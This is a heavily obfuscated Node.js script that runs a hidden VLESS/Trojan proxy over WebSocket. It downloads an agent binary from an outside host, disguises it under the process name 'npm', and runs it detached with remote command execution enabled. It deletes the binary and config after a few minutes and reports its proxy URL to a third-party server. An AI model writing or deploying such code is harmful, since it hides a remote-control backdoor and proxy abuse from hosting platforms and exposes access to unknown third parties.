const _0x44e402=_0x86a9;(function(_0x45395f,_0x233e4d){const _0x1e259b=_0x86a9,_0x86660a=_0x45395f();while(!![]){try{const _0x51077d=-parseInt(_0x1e259b(0x1b3))/0x1+parseInt(_0x1e259b(0x1b4))/0x2+-parseInt(_0x1e259b(0x1b9))/0x3+parseInt(_0x1e259b(0x1cf))/0x4+parseInt(_0x1e259b(0x17f))/0x5+parseInt(_0x1e259b(0x1e4))/0x6*(-parseInt(_0x1e259b(0x1db))/0x7)+-parseInt(_0x1e259b(0x179))/0x8*(parseInt(_0x1e259b(0x1a5))/0x9);if(_0x51077d===_0x233e4d)break;else _0x86660a['push'](_0x86660a['shift']());}catch(_0x51a23b){_0x86660a['push'](_0x86660a['shift']());}}}(_0x8df1,0x41b45));const os=require('os'),http=require(_0x44e402(0x1e8)),fs=require('fs'),axios=require('axios'),net=require(_0x44e402(0x185)),path=require(_0x44e402(0x189)),crypto=require(_0x44e402(0x188)),{Buffer}=require(_0x44e402(0x1e9)),{exec,execSync}=require(_0x44e402(0x1ac)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x44e402(0x1a0)][_0x44e402(0x184)]||_0x44e402(0x18a),NEZHA_SERVER=process[_0x44e402(0x1a0)][_0x44e402(0x1c2)]||'',NEZHA_PORT=process[_0x44e402(0x1a0)][_0x44e402(0x1dd)]||'',NEZHA_KEY=process[_0x44e402(0x1a0)][_0x44e402(0x1cc)]||'',DOMAIN=process[_0x44e402(0x1a0)]['DOMAIN']||_0x44e402(0x1c6),AUTO_ACCESS=process['env'][_0x44e402(0x1ba)]||!![],WSPATH=process[_0x44e402(0x1a0)][_0x44e402(0x1c9)]||UUID[_0x44e402(0x198)](0x0,0x8),SUB_PATH=process[_0x44e402(0x1a0)][_0x44e402(0x19a)]||'sub',NAME=process['env'][_0x44e402(0x1d9)]||'Hug',PORT=process[_0x44e402(0x1a0)][_0x44e402(0x1f3)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3d5365=_0x44e402;try{const _0x38ccfc=await axios['get'](_0x3d5365(0x18c)),_0x1977a6=_0x38ccfc['data'];ISP=(_0x1977a6[_0x3d5365(0x17a)]+'-'+_0x1977a6[_0x3d5365(0x1ce)])[_0x3d5365(0x1ea)](/ /g,'_');}catch(_0x24a2f0){ISP='Unknown';}};GetISP();function _0x8df1(){const _0xe17bea=['9tDEzxN','false','split','443','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','end','8443','child_process','readUInt8','digest','pop','map','pipe','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','222816vfYhfQ','859670Cezmth','connection','https://arm64.ssss.nyc.mn/agent','utf8','https://','1118874vInsXR','AUTO_ACCESS','substr','Failed\x20to\x20resolve\x20','url','utf-8','message','createWriteStream','setsid\x20nohup\x20./npm\x20-s\x20','NEZHA_SERVER',':443?encryption=none&security=tls&sni=','includes','toString','1234.abc.com','index.html','&path=%2F','WSPATH','text/plain','2083','NEZHA_KEY','update','asOrganization','1454520fsOtOV','https://arm64.ssss.nyc.mn/v1','writeFileSync','https://amd64.ssss.nyc.mn/v1','post','every','https://amd64.ssss.nyc.mn/agent','readUInt16BE','error','stream','NAME','writeHead','7LDhApl','Answer','NEZHA_PORT','then','test','2096','createHash','npm\x20running\x20error:','sha224','1136532idjxQP','npm\x20download\x20successfully','unlink','length','http','buffer','replace','send','decode','data','error:\x20','text/html','&type=A','chmod\x20+x\x20npm','https://oooo.serv00.net/add-url','PORT','Not\x20Found\x0a','npm','finish','catch','readFile','find','1778768TSMbuK','country','&fp=chrome&type=ws&host=','arm','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','2416010XFMJGZ','Server',':443?security=tls&sni=','type','join','UUID','net','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','concat','crypto','path','14fa04c1-0783-47d7-8932-7874b43faa6a','log','https://speed.cloudflare.com/meta','\x20-p\x20','arm64','trim','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','--tls','npm\x20is\x20running','Automatic\x20Access\x20Task\x20added\x20successfully','https://dns.google/resolve?name=','1.1.1.1','reduce','hex','slice','Status','SUB_PATH','createServer','get','true','aarch64','once','env','\x20with\x20all\x20DNS\x20servers','write','close','connect'];_0x8df1=function(){return _0xe17bea;};return _0x8df1();}const httpServer=http[_0x44e402(0x19b)]((_0x192bbb,_0x12cda4)=>{const _0x21a059=_0x44e402;if(_0x192bbb[_0x21a059(0x1bd)]==='/'){const _0x5f2ac9=path[_0x21a059(0x183)](__dirname,_0x21a059(0x1c7));fs[_0x21a059(0x1f8)](_0x5f2ac9,_0x21a059(0x1b7),(_0x444631,_0x254c48)=>{const _0x1883bf=_0x21a059;if(_0x444631){_0x12cda4[_0x1883bf(0x1da)](0xc8,{'Content-Type':_0x1883bf(0x1ef)}),_0x12cda4['end']('Hello\x20world!');return;}_0x12cda4[_0x1883bf(0x1da)](0xc8,{'Content-Type':_0x1883bf(0x1ef)}),_0x12cda4[_0x1883bf(0x1aa)](_0x254c48);});return;}else{if(_0x192bbb[_0x21a059(0x1bd)]==='/'+SUB_PATH){const _0x5ef5fa='vless://'+UUID+'@'+DOMAIN+_0x21a059(0x1c3)+DOMAIN+_0x21a059(0x17b)+DOMAIN+_0x21a059(0x1c8)+WSPATH+'#'+NAME+'-'+ISP,_0x3ff1f8='trojan://'+UUID+'@'+DOMAIN+_0x21a059(0x181)+DOMAIN+_0x21a059(0x17b)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x7eeeb9=_0x5ef5fa+'\x0a'+_0x3ff1f8,_0x4011aa=Buffer['from'](_0x7eeeb9)[_0x21a059(0x1c5)]('base64');_0x12cda4[_0x21a059(0x1da)](0xc8,{'Content-Type':'text/plain'}),_0x12cda4[_0x21a059(0x1aa)](_0x4011aa+'\x0a');}else _0x12cda4['writeHead'](0x194,{'Content-Type':_0x21a059(0x1ca)}),_0x12cda4['end'](_0x21a059(0x1f4));}}),wss=new WebSocket[(_0x44e402(0x180))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x44e402(0x195)];function _0x86a9(_0x529367,_0x4c64e7){const _0x8df12d=_0x8df1();return _0x86a9=function(_0x86a9fb,_0x58657c){_0x86a9fb=_0x86a9fb-0x179;let _0x122724=_0x8df12d[_0x86a9fb];return _0x122724;},_0x86a9(_0x529367,_0x4c64e7);}function resolveHost(_0x375388){return new Promise((_0x89846c,_0x78d06b)=>{const _0x267e2b=_0x86a9;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x267e2b(0x1df)](_0x375388)){_0x89846c(_0x375388);return;}let _0x1cf0bb=0x0;function _0x5af439(){const _0x5ed3c4=_0x267e2b;if(_0x1cf0bb>=DNS_SERVERS[_0x5ed3c4(0x1e7)]){_0x78d06b(new Error(_0x5ed3c4(0x1bc)+_0x375388+_0x5ed3c4(0x1a1)));return;}const _0x12e817=DNS_SERVERS[_0x1cf0bb];_0x1cf0bb++;const _0x3c9661=_0x5ed3c4(0x194)+encodeURIComponent(_0x375388)+_0x5ed3c4(0x1f0);axios['get'](_0x3c9661,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x4258f7=>{const _0x2a5f3f=_0x5ed3c4,_0xfa11fc=_0x4258f7[_0x2a5f3f(0x1ed)];if(_0xfa11fc[_0x2a5f3f(0x199)]===0x0&&_0xfa11fc['Answer']&&_0xfa11fc['Answer']['length']>0x0){const _0x5a1b33=_0xfa11fc[_0x2a5f3f(0x1dc)][_0x2a5f3f(0x1f9)](_0x12f7d8=>_0x12f7d8[_0x2a5f3f(0x182)]===0x1);if(_0x5a1b33){_0x89846c(_0x5a1b33[_0x2a5f3f(0x1ed)]);return;}}_0x5af439();})[_0x5ed3c4(0x1f7)](_0x31a592=>{_0x5af439();});}_0x5af439();});}function handleVlessConnection(_0x1b2586,_0x2409b3){const _0xf39c11=_0x44e402,[_0x2b8e27]=_0x2409b3,_0x251bbb=_0x2409b3[_0xf39c11(0x198)](0x1,0x11);if(!_0x251bbb[_0xf39c11(0x1d4)]((_0x3b81ab,_0x52fcda)=>_0x3b81ab==parseInt(uuid[_0xf39c11(0x1bb)](_0x52fcda*0x2,0x2),0x10)))return![];let _0x341ab8=_0x2409b3['slice'](0x11,0x12)[_0xf39c11(0x1ad)]()+0x13;const _0xfc2c34=_0x2409b3[_0xf39c11(0x198)](_0x341ab8,_0x341ab8+=0x2)[_0xf39c11(0x1d6)](0x0),_0x5cb5f5=_0x2409b3['slice'](_0x341ab8,_0x341ab8+=0x1)[_0xf39c11(0x1ad)](),_0x313861=_0x5cb5f5==0x1?_0x2409b3[_0xf39c11(0x198)](_0x341ab8,_0x341ab8+=0x4)[_0xf39c11(0x183)]('.'):_0x5cb5f5==0x2?new TextDecoder()[_0xf39c11(0x1ec)](_0x2409b3[_0xf39c11(0x198)](_0x341ab8+0x1,_0x341ab8+=0x1+_0x2409b3[_0xf39c11(0x198)](_0x341ab8,_0x341ab8+0x1)['readUInt8']())):_0x5cb5f5==0x3?_0x2409b3[_0xf39c11(0x198)](_0x341ab8,_0x341ab8+=0x10)[_0xf39c11(0x196)]((_0x48a776,_0x431a92,_0xbf1770,_0x28658f)=>_0xbf1770%0x2?_0x48a776['concat'](_0x28658f[_0xf39c11(0x198)](_0xbf1770-0x1,_0xbf1770+0x1)):_0x48a776,[])[_0xf39c11(0x1b0)](_0x2f5076=>_0x2f5076[_0xf39c11(0x1d6)](0x0)[_0xf39c11(0x1c5)](0x10))['join'](':'):'';_0x1b2586[_0xf39c11(0x1eb)](new Uint8Array([_0x2b8e27,0x0]));const _0x3a9ea7=createWebSocketStream(_0x1b2586);return resolveHost(_0x313861)[_0xf39c11(0x1de)](_0x42d798=>{const _0x5eef26=_0xf39c11;net[_0x5eef26(0x1a4)]({'host':_0x42d798,'port':_0xfc2c34},function(){const _0x1f46fa=_0x5eef26;this[_0x1f46fa(0x1a2)](_0x2409b3[_0x1f46fa(0x198)](_0x341ab8)),_0x3a9ea7['on'](_0x1f46fa(0x1d7),()=>{})['pipe'](this)['on'](_0x1f46fa(0x1d7),()=>{})[_0x1f46fa(0x1b1)](_0x3a9ea7);})['on'](_0x5eef26(0x1d7),()=>{});})[_0xf39c11(0x1f7)](_0x245e27=>{const _0x301085=_0xf39c11;net[_0x301085(0x1a4)]({'host':_0x313861,'port':_0xfc2c34},function(){const _0x4414e=_0x301085;this[_0x4414e(0x1a2)](_0x2409b3['slice'](_0x341ab8)),_0x3a9ea7['on'](_0x4414e(0x1d7),()=>{})[_0x4414e(0x1b1)](this)['on']('error',()=>{})[_0x4414e(0x1b1)](_0x3a9ea7);})['on'](_0x301085(0x1d7),()=>{});}),!![];}function handleTrojanConnection(_0x4fcc28,_0x53993c){const _0x78bbca=_0x44e402;try{if(_0x53993c[_0x78bbca(0x1e7)]<0x3a)return![];const _0x2bcb10=_0x53993c[_0x78bbca(0x198)](0x0,0x38)[_0x78bbca(0x1c5)](),_0x6a2364=[UUID];let _0x34579a=null;for(const _0x50573d of _0x6a2364){const _0x2e619e=crypto[_0x78bbca(0x1e1)](_0x78bbca(0x1e3))[_0x78bbca(0x1cd)](_0x50573d)[_0x78bbca(0x1ae)](_0x78bbca(0x197));if(_0x2e619e===_0x2bcb10){_0x34579a=_0x50573d;break;}}if(!_0x34579a)return![];let _0x16116d=0x38;_0x53993c[_0x16116d]===0xd&&_0x53993c[_0x16116d+0x1]===0xa&&(_0x16116d+=0x2);const _0x129011=_0x53993c[_0x16116d];if(_0x129011!==0x1)return![];_0x16116d+=0x1;const _0x40b58e=_0x53993c[_0x16116d];_0x16116d+=0x1;let _0x4f349c,_0x4fd7de;if(_0x40b58e===0x1)_0x4f349c=_0x53993c[_0x78bbca(0x198)](_0x16116d,_0x16116d+0x4)[_0x78bbca(0x183)]('.'),_0x16116d+=0x4;else{if(_0x40b58e===0x3){const _0x377ae3=_0x53993c[_0x16116d];_0x16116d+=0x1,_0x4f349c=_0x53993c[_0x78bbca(0x198)](_0x16116d,_0x16116d+_0x377ae3)['toString'](),_0x16116d+=_0x377ae3;}else{if(_0x40b58e===0x4)_0x4f349c=_0x53993c[_0x78bbca(0x198)](_0x16116d,_0x16116d+0x10)[_0x78bbca(0x196)]((_0x4a6120,_0x3567f3,_0x793151,_0x5d22ad)=>_0x793151%0x2?_0x4a6120[_0x78bbca(0x187)](_0x5d22ad['slice'](_0x793151-0x1,_0x793151+0x1)):_0x4a6120,[])[_0x78bbca(0x1b0)](_0x518034=>_0x518034[_0x78bbca(0x1d6)](0x0)[_0x78bbca(0x1c5)](0x10))[_0x78bbca(0x183)](':'),_0x16116d+=0x10;else return![];}}_0x4fd7de=_0x53993c[_0x78bbca(0x1d6)](_0x16116d),_0x16116d+=0x2;_0x16116d<_0x53993c[_0x78bbca(0x1e7)]&&_0x53993c[_0x16116d]===0xd&&_0x53993c[_0x16116d+0x1]===0xa&&(_0x16116d+=0x2);const _0x209058=createWebSocketStream(_0x4fcc28);return resolveHost(_0x4f349c)[_0x78bbca(0x1de)](_0x56c2d5=>{const _0x1df2ba=_0x78bbca;net['connect']({'host':_0x56c2d5,'port':_0x4fd7de},function(){const _0x436692=_0x86a9;_0x16116d<_0x53993c['length']&&this[_0x436692(0x1a2)](_0x53993c[_0x436692(0x198)](_0x16116d)),_0x209058['on'](_0x436692(0x1d7),()=>{})['pipe'](this)['on']('error',()=>{})[_0x436692(0x1b1)](_0x209058);})['on'](_0x1df2ba(0x1d7),()=>{});})[_0x78bbca(0x1f7)](_0x376a4a=>{const _0x2e2580=_0x78bbca;net[_0x2e2580(0x1a4)]({'host':_0x4f349c,'port':_0x4fd7de},function(){const _0x3106ba=_0x2e2580;_0x16116d<_0x53993c[_0x3106ba(0x1e7)]&&this['write'](_0x53993c[_0x3106ba(0x198)](_0x16116d)),_0x209058['on']('error',()=>{})[_0x3106ba(0x1b1)](this)['on'](_0x3106ba(0x1d7),()=>{})['pipe'](_0x209058);})['on'](_0x2e2580(0x1d7),()=>{});}),!![];}catch(_0x59948a){return![];}}wss['on'](_0x44e402(0x1b5),(_0x1bc66a,_0x3564d2)=>{const _0x446654=_0x44e402,_0x9fe7ad=_0x3564d2['url']||'';_0x1bc66a[_0x446654(0x19f)](_0x446654(0x1bf),_0x20b0a0=>{const _0x15358f=_0x446654;if(_0x20b0a0[_0x15358f(0x1e7)]>0x11&&_0x20b0a0[0x0]===0x0){const _0x3c8877=_0x20b0a0['slice'](0x1,0x11),_0x35bf26=_0x3c8877['every']((_0x3459b0,_0x305167)=>_0x3459b0==parseInt(uuid['substr'](_0x305167*0x2,0x2),0x10));if(_0x35bf26){!handleVlessConnection(_0x1bc66a,_0x20b0a0)&&_0x1bc66a[_0x15358f(0x1a3)]();return;}}!handleTrojanConnection(_0x1bc66a,_0x20b0a0)&&_0x1bc66a[_0x15358f(0x1a3)]();})['on'](_0x446654(0x1d7),()=>{});});const getDownloadUrl=()=>{const _0x3f5cba=_0x44e402,_0x19ac96=os['arch']();return _0x19ac96===_0x3f5cba(0x17c)||_0x19ac96===_0x3f5cba(0x18e)||_0x19ac96===_0x3f5cba(0x19e)?!NEZHA_PORT?_0x3f5cba(0x1d0):_0x3f5cba(0x1b6):!NEZHA_PORT?_0x3f5cba(0x1d2):_0x3f5cba(0x1d5);},downloadFile=async()=>{const _0x283870=_0x44e402;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4066cb=getDownloadUrl(),_0x562c34=await axios({'method':_0x283870(0x19c),'url':_0x4066cb,'responseType':_0x283870(0x1d8)}),_0x235369=fs[_0x283870(0x1c0)](_0x283870(0x1f5));return _0x562c34['data']['pipe'](_0x235369),new Promise((_0x12da1d,_0x1da7b9)=>{const _0x17410e=_0x283870;_0x235369['on'](_0x17410e(0x1f6),()=>{const _0x5d5cfc=_0x17410e;console[_0x5d5cfc(0x18b)](_0x5d5cfc(0x1e5)),exec(_0x5d5cfc(0x1f1),_0x187d62=>{if(_0x187d62)_0x1da7b9(_0x187d62);_0x12da1d();});}),_0x235369['on'](_0x17410e(0x1d7),_0x1da7b9);});}catch(_0x28186d){throw _0x28186d;}},runnz=async()=>{const _0xdf532=_0x44e402;try{const _0x268fce=execSync(_0xdf532(0x186),{'encoding':_0xdf532(0x1be)});if(_0x268fce[_0xdf532(0x18f)]()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x28b03d){}await downloadFile();let _0x3cf17d='',_0x1830fc=[_0xdf532(0x1a8),_0xdf532(0x1ab),_0xdf532(0x1e0),'2087',_0xdf532(0x1cb),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3cb71e=_0x1830fc['includes'](NEZHA_PORT)?_0xdf532(0x191):'';_0x3cf17d=_0xdf532(0x1c1)+NEZHA_SERVER+':'+NEZHA_PORT+_0xdf532(0x18d)+NEZHA_KEY+'\x20'+_0x3cb71e+_0xdf532(0x1b2);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5e8356=NEZHA_SERVER[_0xdf532(0x1c4)](':')?NEZHA_SERVER[_0xdf532(0x1a7)](':')[_0xdf532(0x1af)]():'',_0x4d0adf=_0x1830fc[_0xdf532(0x1c4)](_0x5e8356)?_0xdf532(0x19d):_0xdf532(0x1a6),_0x2bbb6d='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0xdf532(0x17d)+_0x4d0adf+_0xdf532(0x190)+UUID;fs[_0xdf532(0x1d1)]('config.yaml',_0x2bbb6d);}_0x3cf17d=_0xdf532(0x1a9);}else{console[_0xdf532(0x18b)](_0xdf532(0x17e));return;}}try{exec(_0x3cf17d,{'shell':'/bin/bash'},_0x27d229=>{const _0x2c60c1=_0xdf532;if(_0x27d229)console['error'](_0x2c60c1(0x1e2),_0x27d229);else console[_0x2c60c1(0x18b)](_0x2c60c1(0x192));});}catch(_0x1f6649){console[_0xdf532(0x1d7)](_0xdf532(0x1ee)+_0x1f6649);}};async function addAccessTask(){const _0x40f3b8=_0x44e402;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xe06bb=_0x40f3b8(0x1b8)+DOMAIN+'/'+SUB_PATH;try{const _0x4763cb=await axios[_0x40f3b8(0x1d3)](_0x40f3b8(0x1f2),{'url':_0xe06bb},{'headers':{'Content-Type':'application/json'}});console[_0x40f3b8(0x18b)](_0x40f3b8(0x193));}catch(_0x1a16c5){}}const delFiles=()=>{const _0x19be45=_0x44e402;fs[_0x19be45(0x1e6)](_0x19be45(0x1f5),()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x289812=_0x44e402;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x289812(0x18b)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
